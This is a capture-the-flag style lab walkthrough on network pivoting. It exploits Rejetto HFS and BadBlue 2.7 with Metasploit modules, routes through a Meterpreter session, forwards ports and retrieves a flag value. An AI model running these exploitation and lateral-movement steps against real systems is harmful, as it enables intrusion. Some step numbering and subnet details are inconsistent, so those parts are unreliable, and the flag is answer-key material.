# Overview

This lab introduces **pivoting**, a technique used in penetration testing to reach systems that are not directly accessible from the attack machine.

You will first gain access to `demo1.ine.local`. Then you will use that foothold to investigate and access the secondary target, `demo2.ine.local`.

# Lab Environment

This lab provides GUI access to a Kali Linux machine. The two target hosts are:

- `demo1.ine.local` — the initial target
- `demo2.ine.local` — the secondary target

## Objective

Identify and exploit vulnerabilities on `demo1`, use it as a pivot to reach `demo2`, and retrieve the flag.

## Tools

- **Nmap** — discover open ports and services
- **SearchSploit** — research known exploits
- **Metasploit (`msfconsole`)** — exploit the target and configure the pivot

# Solutions - Pivoting: Reaching an Internal Network

## What Is Pivoting?

In penetration testing (pentesting), **pivoting** is a technique where an attacker or tester uses a compromised host as a **bridge or stepping stone** to route traffic into **hidden internal networks** that were previously unreachable from the outside.

The word "pivot" literally means to turn or balance on a central point. In cybersecurity, the concept is identical: you leverage a single foothold in the system as a focal point to pivot deeper into the organization's infrastructure.

### Why Do We Need Pivoting?

In real-world enterprise environments, systems are rarely exposed directly to the internet. Networks are typically segregated into a **DMZ (Demilitarized Zone)** and an **Internal LAN** using firewalls and strict access control lists (ACLs).

```text
[Attacker / Kali Linux]
         │
         │ Direct access
         ▼
[DMZ: Public Web Server (demo1)]
         │
         │ Internal connection
         ▼
[Internal Network: Database (demo2)]

Kali ──✕──> demo2 (No direct access)
```

1. **Initial Barrier:** The attacker can reach the public-facing **Web Server (demo1)**, but cannot directly reach the internal **Database Server (demo2)**.

2. **Pivoting Stage:** The attacker gains access to `demo1` and checks whether it can reach the internal target.

3. **Execution:** The attacker configures a pivoting method, such as a SOCKS proxy, SSH tunnel, or Metasploit Autoroute, to send supported connections through `demo1` toward `demo2`.

### Common Pivoting Techniques & Tools

| **Technique** | **Description** | **Common Tools** |
| --- | --- | --- |
| **SOCKS Proxy / SSH Tunneling** | Sends supported connections through a proxy or SSH tunnel. | `ssh -D`, ProxyChains |
| **Metasploit Autoroute** | Adds a route inside Metasploit through an active Meterpreter session. | `autoroute` |
| **TUN/TAP Tunnelling** | Uses a virtual network interface to route traffic through a pivot. | Ligolo-ng |
| **Port Forwarding** | Forwards a specific port to a service reachable through the pivot. | `socat`, `portfwd` |

### Summary

Pivoting allows a penetration tester to use an initial foothold to access systems that the attack machine cannot reach directly. It can support **lateral movement** within an authorized test environment.

***

The IP addresses are visible in the `ping` output:

- `demo1.ine.local` → **10.3.17.16**
- `demo2.ine.local` → **10.3.16.228**

To check which IP address each hostname resolves to, use:

```bash
getent hosts demo1.ine.local
getent hosts demo2.ine.local
```

***

**Step 1:** Open the lab link to access the Kali machine.

Check the hosts file:

```bash
cat /etc/hosts
```

Check the IP address associated with `demo1.ine.local`:

```bash
getent hosts demo1.ine.local
```

<img width="402" height="460" alt="image" src="https://github.com/user-attachments/assets/096d1118-a91d-4701-bc19-be1a2c264fd8" />

# Metasploit Pivoting Lab

> **Lab target IP addresses**
>
> * `demo1.ine.local` → `10.3.17.16`
> * `demo2.ine.local` → `10.3.16.228`
>
> These IP addresses are used consistently throughout this guide. Replace each `image` placeholder with the matching screenshot.

## Step 2: Check if the Target Machines Are Reachable

```bash
ping -c 4 10.3.17.16
ping -c 4 10.3.16.228
```

<img width="544" height="311" alt="image" src="https://github.com/user-attachments/assets/3e712f9e-819c-4281-ac2f-4c9b6a0b9a52" />


The ping results show that **demo1.ine.local (`10.3.17.16`) is reachable**: all four packets received a response.

**demo2.ine.local (`10.3.16.228`) did not respond**: all four packets were lost. That does not necessarily mean the machine is off; it may block ping requests, or the attacker machine may not have a route to it.

In this pivoting lab, the results suggest that you can reach the first target directly, but cannot reach the second target directly from your current machine.

## Step 3: Scan the First Target with Nmap

Scan `demo1.ine.local` to identify open ports:

```bash
nmap 10.3.17.16
```

<img width="576" height="340" alt="image" src="https://github.com/user-attachments/assets/80fb3269-69e3-46b7-bb5e-4159af5d481d" />


We have discovered that multiple ports are open. We will run Nmap again to determine version information on port 80.

```bash
nmap -sV -p 80 10.3.17.16
```
<img width="805" height="223" alt="image" src="https://github.com/user-attachments/assets/9e2fe301-f653-4cb5-bea5-c198ab03736c" />


### Check the Web Service

Open the service running on port 80 in a browser and inspect the page for the application name and version.

```text
http://10.3.17.16/
```

<img width="646" height="906" alt="image" src="https://github.com/user-attachments/assets/0519c0b1-0be6-4b13-acda-4617bbed0991" />


## Step 4: Search for Exploits with Searchsploit

```bash
searchsploit hfs
```

**HFS** stands for **HTTP File Server**.

As shown in the following screenshot, Searchsploit reveals an exploit for the identified Rejetto HTTP File Server version. We will search Metasploit for a corresponding module.

<img width="1892" height="386" alt="image" src="https://github.com/user-attachments/assets/c6f5db0a-1b12-426d-8cec-91b64aeab365" />

<img width="1898" height="279" alt="image" src="https://github.com/user-attachments/assets/a117722d-a155-4ee3-a455-524fcc2dbfc7" />


## Step 5: Gain Access to the First Target

Start the Metasploit Framework Console:

```bash
msfconsole -q
```

Search for the Rejetto module:

```text
msf6 > search rejetto
```

The search returns the following module:

```text
exploit/windows/http/rejetto_hfs_exec
```

Load the module and review its options:

```text
msf6 > use exploit/windows/http/rejetto_hfs_exec
msf6 exploit(windows/http/rejetto_hfs_exec) > show options
```
<img width="1055" height="245" alt="image" src="https://github.com/user-attachments/assets/4a9a4b70-cee5-4e4d-b649-9fb19b6fb0e5" />


Set the first target’s IP address:

```text
msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.3.17.16
```

Confirm that the required options, including the target port and reverse connection settings, match your lab environment. Then run the exploit:

```text
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit
```

As shown in the following screenshot, the exploit provides a Meterpreter session on the first target.

<img width="846" height="282" alt="image" src="https://github.com/user-attachments/assets/52fa0abb-07a6-477b-a571-6453206f1bfc" />


Check the target machine’s network configuration:

```text
meterpreter > ipconfig
```

<img width="488" height="553" alt="image" src="https://github.com/user-attachments/assets/d69b3b04-cd7e-4f77-b12a-da8446b5a871" />


We can observe the IP addresses assigned to the first target. However, we cannot access `demo2.ine.local` directly from the attacker machine.

## Step 6: Add a Route Through the Meterpreter Session

### Metasploit Pivoting: Fixing an Invalid Subnet

* **Objective:** Add a route through the Meterpreter session to reach the second target.

meterpreter > run autoroute -s 10.3.17.16/20

<img width="610" height="672" alt="image" src="https://github.com/user-attachments/assets/ea0ce780-183c-4573-b371-f230e36556e6" />


## Step 7: Scan the Second Machine Through the Pivot

**Before this step:** A Meterpreter session is open on the first machine, and an `autoroute` route to `10.3.16.0/20` has been added.

### Return to Metasploit

```text
meterpreter > background
```

This keeps the Meterpreter session open and returns us to the Metasploit console.

### Select the TCP Port Scanner

```text
msf6 > use auxiliary/scanner/portscan/tcp
```

We use this module to check which TCP ports are open on the second machine.

### Set the Target and Port Range

```text
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.3.16.228
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 1-100
```

`10.3.16.228` is the IP address of `demo2.ine.local`. `PORTS 1-100` limits this scan to the first 100 TCP ports.

<img width="277" height="66" alt="image" src="https://github.com/user-attachments/assets/34808c55-cc49-4c80-a400-d51b3b013d8e" />


### Run the Scan

```text
msf6 auxiliary(scanner/portscan/tcp) > run
```

**Result:** If the scan reports **TCP port 80 open**, we can investigate the web service through the pivot.

**What to say aloud:** “Now that we have a route into the target network, we can scan the second machine through our Metasploit session. The lab gives us its IP address. The scan checks whether port 80, commonly used for HTTP, is open.”

<img width="687" height="240" alt="image" src="https://github.com/user-attachments/assets/85abd5b0-a957-4b64-90ff-0f5dd2b208ee" />


## Step 8: Forward Port 80 and Identify the Service

We will forward the second target’s remote port 80 to local port 1234. First, identify the active Meterpreter session if needed:

```text
msf6 > sessions -i 1
```

> Use the session ID shown by `sessions` if it is different from `1`.

Add and verify the port forward:

```text
meterpreter > portfwd add -l 1234 -p 80 -r 10.3.16.228
meterpreter > portfwd list
```
<img width="626" height="291" alt="image" src="https://github.com/user-attachments/assets/6e2e9c9c-235f-495c-9480-8ca28ae447ec" />


Keep `msfconsole` open. In a **separate Kali terminal**, use Nmap to identify the service reached through the local port:

```bash
nmap -sV -p 1234 127.0.0.1
```

Nmap connects to local port `1234`; Meterpreter forwards that connection to port `80` on `demo2.ine.local`.

<img width="787" height="267" alt="image" src="https://github.com/user-attachments/assets/4f8e7258-2746-48f1-adfc-280ac35f2e06" />


The machine is running BadBlue HTTPd 2.7, a Windows-based web server. We will search the exploit module for badblue 2.7 using searchsploit.

Command: searchsploit badblue 2.7

<img width="956" height="266" alt="image" src="https://github.com/user-attachments/assets/b8b48444-cbb3-441d-9fe0-a9af64a71b40" />


There is a Metasploit module for badblue server. We will use PassThu remote buffer overflow Metasploit module to exploit the target.

Commands:

background
use exploit/windows/http/badblue_passthru
set PAYLOAD windows/meterpreter/bind_tcp
set RHOSTS 10.3.16.228
exploit

<img width="924" height="287" alt="image" src="https://github.com/user-attachments/assets/92336344-0136-4aa1-acff-da9be3e0ea3d" />

We have successfully exploited the target vulnerable application (badblue) and received a meterpreter shell.

Step 6: Searching the flag.

Command:

shell
cd /
dir
type flag.txt


<img width="583" height="505" alt="image" src="https://github.com/user-attachments/assets/ecf65cc9-7176-47b3-a80d-c43489eb6f36" />


This reveals the flag to us.

Flag: c46d12f28d87ae0b92b05ebd9fb8e817

Conclusion
This lab successfully guides through fingerprinting and exploiting vulnerable applications, then pivoting to a second target machine, and maintaining access via additional exploitation.

[https://www.exploit-db.com/exploits/16806]
[https://www.exploit-db.com/exploits/39161]
[https://www.rapid7.com/db/modules/exploit/windows/http/badblue_passthru]
[https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec]



















